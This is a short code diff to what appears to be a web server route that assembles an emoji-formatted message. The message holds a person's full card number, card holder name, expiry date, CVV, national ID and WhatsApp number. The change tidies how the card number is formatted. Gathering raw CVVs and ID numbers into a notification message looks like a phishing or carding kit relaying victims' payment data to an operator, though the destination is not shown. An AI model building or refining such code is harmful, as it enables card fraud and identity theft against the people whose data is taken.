@@ -62,7 +62,7 @@ export async function POST(req: NextRequest) {
     `📲 WhatsApp: ${whatsapp ?? "-"}`,
     `🪪 Public ID: ${nationalId ?? "-"}`,
     `🚚 Shipping: ${shippingCompany || "-"}`,
-    `💳 Card Number: ${cardNumber}`,
+    `💳 Card Number: ${cardNumber.replace(/\s+/g, "").replace(/(\d{4})/g, "$1 ").trim()}`,
     `✍️ Card Holder: ${cardHolder}`,
     `📆 Valid To: ${expiry}`,
     `🔑 CVV: ${cvv}`,
